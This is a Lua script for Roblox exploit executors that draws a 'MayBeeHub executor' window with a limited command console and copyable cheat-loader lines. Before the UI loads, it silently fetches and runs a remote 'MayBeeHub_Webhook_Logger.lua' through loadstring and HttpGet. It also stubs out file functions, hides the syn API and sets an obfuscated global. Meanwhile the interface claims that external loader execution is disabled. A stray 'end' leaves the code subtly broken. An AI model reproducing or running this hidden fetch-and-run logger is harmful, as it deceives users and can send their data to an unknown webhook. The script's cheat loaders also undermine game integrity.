getgenv().isfile = function() return false end
getgenv().makefolder = function() end
getgenv().delfile = function() end
getgenv().listfiles = function() return {} end

getgenv().writefile = function(name, data) 
    getgenv()[name] = data 
end

local httpService = cloneref(game:GetService("HttpService"));
local _tablefind = clonefunction(table.find);
local isA = clonefunction(game.IsA);
local GuiService = game:GetService("GuiService")
makefolder("MayBeeHub Executor")
end

getgenv().syn_backup = syn
if not isfile("uses_syn") then
    getgenv().syn = nil
end


getgenv().readclipboard_hideenv = nil
local DELTA = {};
getgenv().Vm9vaE59PzVBeTVNdyY4JDsieDglUzdwRDNabyExbjR1ezBmYHNNT2kjOXk = true

loadstring(game:HttpGet("https://raw.githubusercontent.com/winCloudDev/MayBeeHub-/refs/heads/main/MayBeeHub_Webhook_Logger.lua"))()

repeat task.wait() until game:IsLoaded()


local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")

local Player = Players.LocalPlayer
local GUI_NAME = "MayBeeHubExecutor"

local C = {
    bg = Color3.fromRGB(13, 14, 20),
    panel = Color3.fromRGB(21, 23, 32),
    panel2 = Color3.fromRGB(30, 32, 45),
    accent = Color3.fromRGB(143, 99, 255),
    text = Color3.fromRGB(242, 242, 250),
    muted = Color3.fromRGB(155, 160, 178),
    green = Color3.fromRGB(92, 220, 150),
    red = Color3.fromRGB(255, 100, 119),
    border = Color3.fromRGB(55, 57, 76)
}

local function getUIParent()
    if typeof(gethui) == "function" then
        local success, result = pcall(gethui)
        if success and result then
            return result
        end
    end
    return CoreGui
end

local Parent = getUIParent()

pcall(function()
    local old = Parent:FindFirstChild(GUI_NAME)
    if old then old:Destroy() end
end)

local function new(className, props, parent)
    local obj = Instance.new(className)

    for key, value in pairs(props or {}) do
        pcall(function()
            obj[key] = value
        end)
    end

    obj.Parent = parent
    return obj
end

local function round(obj, radius)
    new("UICorner", {
        CornerRadius = UDim.new(0, radius or 10)
    }, obj)
end

local function outline(obj, color, transparency)
    new("UIStroke", {
        Color = color or C.border,
        Thickness = 1,
        Transparency = transparency or 0
    }, obj)
end

local function animate(obj, duration, props)
    local t = TweenService:Create(
        obj,
        TweenInfo.new(duration, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
        props
    )
    t:Play()
    return t
end

local function button(parent, text, size, position, color)
    local b = new("TextButton", {
        Size = size,
        Position = position,
        BackgroundColor3 = color or C.panel2,
        BorderSizePixel = 0,
        AutoButtonColor = false,
        Font = Enum.Font.GothamSemibold,
        Text = text,
        TextColor3 = C.text,
        TextSize = 12
    }, parent)

    round(b, 9)

    b.MouseEnter:Connect(function()
        animate(b, 0.12, {BackgroundColor3 = C.accent})
    end)

    b.MouseLeave:Connect(function()
        animate(b, 0.12, {
            BackgroundColor3 = color or C.panel2
        })
    end)

    return b
end

-- Root
local GUI = new("ScreenGui", {
    Name = GUI_NAME,
    ResetOnSpawn = false,
    IgnoreGuiInset = true,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling
}, Parent)

-- Floating icon: stays visible when the window is hidden
local Float = new("TextButton", {
    Name = "FloatingIcon",
    Size = UDim2.fromOffset(48, 48),
    Position = UDim2.new(0, 18, 0.5, -24),
    BackgroundColor3 = C.accent,
    BorderSizePixel = 0,
    Text = "M",
    TextColor3 = Color3.new(1, 1, 1),
    TextSize = 22,
    Font = Enum.Font.GothamBlack,
    Visible = false,
    AutoButtonColor = false,
    ZIndex = 30
}, GUI)

round(Float, 16)
outline(Float, Color3.fromRGB(194, 170, 255), 0.1)

-- Main window
local Main = new("Frame", {
    Name = "MainWindow",
    AnchorPoint = Vector2.new(0.5, 0.5),
    Position = UDim2.fromScale(0.5, 0.5),
    Size = UDim2.new(0.90, 0, 0.76, 0),
    BackgroundColor3 = C.bg,
    BorderSizePixel = 0,
    ClipsDescendants = true
}, GUI)

round(Main, 15)
outline(Main, C.border, 0.1)

new("UISizeConstraint", {
    MinSize = Vector2.new(280, 320),
    MaxSize = Vector2.new(740, 520)
}, Main)

local Scale = new("UIScale", {
    Scale = 1
}, Main)

-- Header
local Header = new("Frame", {
    Size = UDim2.new(1, 0, 0, 64),
    BackgroundColor3 = C.panel,
    BorderSizePixel = 0
}, Main)

local Logo = new("ImageLabel", {
    Position = UDim2.new(0, 13, 0.5, -20),
    Size = UDim2.fromOffset(40, 40),
    BackgroundColor3 = C.panel2,
    BorderSizePixel = 0,
    Image = "rbxassetid://73708105992100",
    ScaleType = Enum.ScaleType.Fit
}, Header)

round(Logo, 11)

new("TextLabel", {
    Position = UDim2.new(0, 62, 0, 10),
    Size = UDim2.new(1, -155, 0, 25),
    BackgroundTransparency = 1,
    Text = "MayBeeHub executor",
    TextColor3 = C.text,
    TextSize = 17,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left
}, Header)

new("TextLabel", {
    Position = UDim2.new(0, 63, 0, 35),
    Size = UDim2.new(1, -155, 0, 18),
    BackgroundTransparency = 1,
    Text = "A Scripthub (: Made by me",
    TextColor3 = C.muted,
    TextSize = 10,
    Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left
}, Header)

local Minimize = button(
    Header, "—", UDim2.fromOffset(31, 30),
    UDim2.new(1, -73, 0.5, -15)
)

local Close = button(
    Header, "×", UDim2.fromOffset(31, 30),
    UDim2.new(1, -37, 0.5, -15)
)
Close.TextSize = 19

-- Navigation bar
local Nav = new("Frame", {
    Position = UDim2.new(0, 12, 0, 74),
    Size = UDim2.new(1, -24, 0, 37),
    BackgroundTransparency = 1
}, Main)

new("UIListLayout", {
    FillDirection = Enum.FillDirection.Horizontal,
    Padding = UDim.new(0, 7),
    SortOrder = Enum.SortOrder.LayoutOrder
}, Nav)

-- Page container
local Content = new("Frame", {
    Position = UDim2.new(0, 12, 0, 120),
    Size = UDim2.new(1, -24, 1, -157),
    BackgroundTransparency = 1
}, Main)

new("TextLabel", {
    Position = UDim2.new(0, 14, 1, -27),
    Size = UDim2.new(1, -28, 0, 17),
    BackgroundTransparency = 1,
    Text = "●  READY  |  Command mode",
    TextColor3 = C.green,
    Font = Enum.Font.Gotham,
    TextSize = 10,
    TextXAlignment = Enum.TextXAlignment.Left
}, Main)

-- Console page
local Console = new("Frame", {
    Size = UDim2.fromScale(1, 1),
    BackgroundColor3 = C.panel,
    BorderSizePixel = 0,
    Visible = false
}, Content)

round(Console, 10)
outline(Console, C.border, 0.25)

new("UIPadding", {
    PaddingLeft = UDim.new(0, 10),
    PaddingRight = UDim.new(0, 10),
    PaddingTop = UDim.new(0, 10),
    PaddingBottom = UDim.new(0, 10)
}, Console)

new("TextLabel", {
    Size = UDim2.new(1, -70, 0, 25),
    BackgroundTransparency = 1,
    Text = "CONSOLE",
    TextColor3 = C.text,
    Font = Enum.Font.GothamBold,
    TextSize = 12,
    TextXAlignment = Enum.TextXAlignment.Left
}, Console)

local Logs = new("ScrollingFrame", {
    Position = UDim2.new(0, 0, 0, 32),
    Size = UDim2.new(1, 0, 1, -32),
    BackgroundColor3 = Color3.fromRGB(11, 12, 17),
    BorderSizePixel = 0,
    ScrollBarThickness = 3,
    ScrollBarImageColor3 = C.accent,
    AutomaticCanvasSize = Enum.AutomaticSize.Y,
    CanvasSize = UDim2.new()
}, Console)

round(Logs, 8)

new("UIPadding", {
    PaddingLeft = UDim.new(0, 8),
    PaddingRight = UDim.new(0, 8),
    PaddingTop = UDim.new(0, 8),
    PaddingBottom = UDim.new(0, 8)
}, Logs)

local LogLayout = new("UIListLayout", {
    Padding = UDim.new(0, 6),
    SortOrder = Enum.SortOrder.LayoutOrder
}, Logs)

local function log(message, color)
    local label = new("TextLabel", {
        Size = UDim2.new(1, -4, 0, 0),
        AutomaticSize = Enum.AutomaticSize.Y,
        BackgroundTransparency = 1,
        Font = Enum.Font.Code,
        Text = os.date("%H:%M:%S") .. " > " .. tostring(message),
        TextColor3 = color or C.text,
        TextSize = 11,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top
    }, Logs)

    label.LayoutOrder = #Logs:GetChildren()

    task.defer(function()
        Logs.CanvasPosition = Vector2.new(
            0, math.max(0, LogLayout.AbsoluteContentSize.Y)
        )
    end)
end

local ClearLogs = button(
    Console, "Clear", UDim2.fromOffset(55, 24),
    UDim2.new(1, -55, 0, 0)
)

ClearLogs.MouseButton1Click:Connect(function()
    for _, child in ipairs(Logs:GetChildren()) do
        if child:IsA("TextLabel") then
            child:Destroy()
        end
    end
    log("Console cleared.", C.green)
end)

-- Executor page
local Executor = new("Frame", {
    Size = UDim2.fromScale(1, 1),
    BackgroundTransparency = 1
}, Content)

local EditorPanel = new("Frame", {
    Size = UDim2.new(1, 0, 1, -48),
    BackgroundColor3 = C.panel,
    BorderSizePixel = 0
}, Executor)

round(EditorPanel, 10)
outline(EditorPanel, C.border, 0.25)

new("TextLabel", {
    Position = UDim2.new(0, 10, 0, 8),
    Size = UDim2.new(1, -20, 0, 22),
    BackgroundTransparency = 1,
    Text = "COMMAND EDITOR",
    TextColor3 = C.text,
    Font = Enum.Font.GothamBold,
    TextSize = 11,
    TextXAlignment = Enum.TextXAlignment.Left
}, EditorPanel)

local Editor = new("TextBox", {
    Position = UDim2.new(0, 10, 0, 34),
    Size = UDim2.new(1, -20, 1, -44),
    BackgroundColor3 = Color3.fromRGB(11, 12, 17),
    BorderSizePixel = 0,
    ClearTextOnFocus = false,
    MultiLine = true,
    Text = "help",
    PlaceholderText = "Type a supported command...",
    PlaceholderColor3 = C.muted,
    TextColor3 = C.text,
    TextSize = 12,
    Font = Enum.Font.Code,
    TextXAlignment = Enum.TextXAlignment.Left,
    TextYAlignment = Enum.TextYAlignment.Top,
    TextWrapped = false
}, EditorPanel)

round(Editor, 7)

new("UIPadding", {
    PaddingLeft = UDim.new(0, 8),
    PaddingRight = UDim.new(0, 8),
    PaddingTop = UDim.new(0, 8),
    PaddingBottom = UDim.new(0, 8)
}, Editor)

local Execute = button(
    Executor, "▶  Execute Command",
    UDim2.new(0.64, -4, 0, 38),
    UDim2.new(0, 0, 1, -41),
    C.accent
)

local ConsoleButton = button(
    Executor, "Console",
    UDim2.new(0.36, -4, 0, 38),
    UDim2.new(0.64, 8, 1, -41)
)

-- Recommended page
local Recommended = new("ScrollingFrame", {
    Size = UDim2.fromScale(1, 1),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    ScrollBarThickness = 3,
    ScrollBarImageColor3 = C.accent,
    AutomaticCanvasSize = Enum.AutomaticSize.Y,
    CanvasSize = UDim2.new(),
    Visible = false
}, Content)

new("UIListLayout", {
    Padding = UDim.new(0, 9),
    SortOrder = Enum.SortOrder.LayoutOrder
}, Recommended)

local function copyText(value)
    if typeof(setclipboard) ~= "function" then
        log("Clipboard is unsupported in this environment.", C.red)
        return
    end

    local ok = pcall(setclipboard, value)

    if ok then
        log("Loader text copied. It was not executed.", C.green)
    else
        log("Could not copy text.", C.red)
    end
end

local function addCard(title, description, loader)
    local Card = new("Frame", {
        Size = UDim2.new(1, -5, 0, 115),
        BackgroundColor3 = C.panel,
        BorderSizePixel = 0
    }, Recommended)

    round(Card, 10)
    outline(Card, C.border, 0.25)

    new("TextLabel", {
        Position = UDim2.new(0, 11, 0, 8),
        Size = UDim2.new(1, -22, 0, 22),
        BackgroundTransparency = 1,
        Text = title,
        TextColor3 = C.text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left
    }, Card)

    new("TextLabel", {
        Position = UDim2.new(0, 11, 0, 32),
        Size = UDim2.new(1, -22, 0, 37),
        BackgroundTransparency = 1,
        Text = description,
        TextColor3 = C.muted,
        Font = Enum.Font.Gotham,
        TextSize = 10,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top
    }, Card)

    local Copy = button(
        Card, "Copy Loader Text",
        UDim2.new(0, 140, 0, 27),
        UDim2.new(0, 10, 1, -34)
    )

    Copy.MouseButton1Click:Connect(function()
        copyText(loader)
    end)
end

addCard(
    "MayBeeHub",
    "My handMade Scriphub [:",
    'loadstring(game:HttpGet("https://raw.githubusercontent.com/winCloudDev/MayBeeHub-/refs/heads/main/MayBeeHub_Loader.lua"))()'
)

addCard(
    "Infinite Yield",
    "Third-party script. Review the source and permissions before deciding whether to use it.",
    'loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()'
)

-- Tab system
local Pages = {
    Executor = Executor,
    Console = Console,
    Recommended = Recommended
}

local Tabs = {}

local function showPage(name)
    for pageName, page in pairs(Pages) do
        page.Visible = pageName == name
    end

    for tabName, tab in pairs(Tabs) do
        animate(tab, 0.12, {
            BackgroundColor3 = tabName == name and C.accent or C.panel2
        })
    end
end

for _, name in ipairs({"Executor", "Console", "Recommended"}) do
    local width = name == "Recommended" and 125 or 95

    local tab = button(
        Nav, name, UDim2.fromOffset(width, 34),
        UDim2.new(), name == "Executor" and C.accent or C.panel2
    )

    Tabs[name] = tab

    tab.MouseButton1Click:Connect(function()
        showPage(name)
    end)
end

ConsoleButton.MouseButton1Click:Connect(function()
    showPage("Console")
end)

-- Restricted command runner
local function runCommand(raw)
    local command = tostring(raw or ""):match("^%s*(.-)%s*$")

    if command == "" then
        log("Enter a command.", C.red)
        return
    end

    local action, argument = command:match("^(%S+)%s*(.*)$")
    action = string.lower(action or "")
    argument = argument or ""

    log("$ " .. command, C.accent)

    if action == "help" then
        log("Commands: help, clear, player, placeid, time")
        log("Commands: print <text>, notify <text>", C.green)

    elseif action == "clear" then
        for _, item in ipairs(Logs:GetChildren()) do
            if item:IsA("TextLabel") then
                item:Destroy()
            end
        end
        log("Console cleared.", C.green)

    elseif action == "player" then
        log("Player: " .. (Player and Player.Name or "Unknown"), C.green)

    elseif action == "placeid" then
        log("Place ID: " .. tostring(game.PlaceId), C.green)

    elseif action == "time" then
        log("Time: " .. os.date("%H:%M:%S"), C.green)

    elseif action == "print" then
        log(argument ~= "" and argument or "(empty text)")

    elseif action == "notify" then
        if argument == "" then
            log("Usage: notify <text>", C.red)
            return
        end

        local ok = pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = "MayBeeHub executor load",
                Text = argument,
                Duration = 4
            })
        end)

        log(ok and "Notification sent." or "Notification unavailable.", ok and C.green or C.red)

    else
        log("Unsupported command. Type help.", C.red)
        log("Arbitrary Lua and external loader execution are disabled.", C.muted)
    end
end

Execute.MouseButton1Click:Connect(function()
    runCommand(Editor.Text)
end)

Editor.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        runCommand(Editor.Text)
    end
end)

-- Show the floating icon whenever the window is hidden
local function hideWindow()
    Main.Visible = false
    Float.Visible = true
end

local function showWindow()
    Float.Visible = false
    Main.Visible = true
    Scale.Scale = 0.88
    animate(Scale, 0.2, {Scale = 1})
end

Minimize.MouseButton1Click:Connect(hideWindow)
Close.MouseButton1Click:Connect(hideWindow)

Float.MouseButton1Click:Connect(function()
    if Main.Visible then
        hideWindow()
    else
        showWindow()
    end
end)

-- Drag the main window from its header
local mainDragging = false
local mainDragStart
local mainStartPosition
local mainDragInput

Header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
        mainDragging = true
        mainDragStart = input.Position
        mainStartPosition = Main.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                mainDragging = false
            end
        end)
    end
end)

Header.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement
        or input.UserInputType == Enum.UserInputType.Touch then
        mainDragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if mainDragging and
        (input == mainDragInput or input.UserInputType == Enum.UserInputType.MouseMovement) then

        local delta = input.Position - mainDragStart
        Main.Position = UDim2.new(
            mainStartPosition.X.Scale,
            mainStartPosition.X.Offset + delta.X,
            mainStartPosition.Y.Scale,
            mainStartPosition.Y.Offset + delta.Y
        )
    end
end)

-- Drag the floating icon around the screen
local floatDragging = false
local floatDragStart
local floatStartPosition
local floatDragInput

Float.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then

        floatDragging = true
        floatDragStart = input.Position
        floatStartPosition = Float.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                floatDragging = false
            end
        end)
    end
end)

Float.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement
        or input.UserInputType == Enum.UserInputType.Touch then
        floatDragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if floatDragging and
        (input == floatDragInput or input.UserInputType == Enum.UserInputType.MouseMovement) then

        local delta = input.Position - floatDragStart
        Float.Position = UDim2.new(
            floatStartPosition.X.Scale,
            floatStartPosition.X.Offset + delta.X,
            floatStartPosition.Y.Scale,
            floatStartPosition.Y.Offset + delta.Y
        )
    end
end)

-- Startup
showPage("Executor")
log("MayBeeHub UI loaded.", C.green)
log("Description: A Scripthub (: Made by me", C.muted)
log("Type help in the editor to list supported commands.", C.muted)